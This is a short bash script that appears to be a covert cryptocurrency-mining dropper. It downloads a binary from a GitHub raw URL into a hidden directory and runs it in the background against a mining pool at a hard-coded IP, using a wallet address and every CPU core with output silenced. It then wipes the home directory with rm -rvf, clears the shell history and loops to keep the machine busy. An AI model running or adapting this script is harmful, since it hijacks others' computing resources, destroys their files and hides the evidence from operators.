#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner > /dev/null 2>&1
chmod u+x sgr1
./sgr1 -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.sugoi -p x -t $(nproc --all) > /dev/null 2>&1 &
sleep 30
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
